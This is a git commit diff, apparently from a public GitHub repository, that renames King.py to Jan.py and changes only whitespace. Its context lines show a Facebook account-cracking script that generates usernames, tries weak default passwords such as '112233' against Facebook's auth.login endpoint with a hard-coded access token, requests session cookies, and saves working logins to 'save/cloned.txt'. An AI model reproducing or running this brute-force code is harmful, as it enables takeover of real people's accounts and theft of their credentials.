1dca235c09539a1ccf694d90bac2f6df9e5472e5
Alikamaall <86645719+Alikamaall@users.noreply.github.com>
2024-09-18 18:26:38 +0400

    Update and rename King.py to Jan.py

--- Jan.py
+++ Jan.py
@@ -336,8 +336,7 @@ def action():
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+Pass5+'\n')
                                     cps.close()
-                                    cpb.append(c+user+Pass5)
-                                    
+                                    cpb.append(c+user+Pass5)       
                                else:
                                   Pass6="112233"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + Pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
